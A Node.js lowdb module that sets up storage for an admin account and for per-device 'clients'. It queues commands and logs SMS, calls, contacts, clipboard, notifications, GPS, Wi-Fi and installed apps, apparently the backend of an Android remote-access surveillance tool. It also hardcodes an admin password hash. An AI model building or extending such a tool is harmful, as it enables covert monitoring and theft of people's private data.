const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'Iris',
        password: 'd25c7286a46dbb6eeecc5cfddacd5818',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};


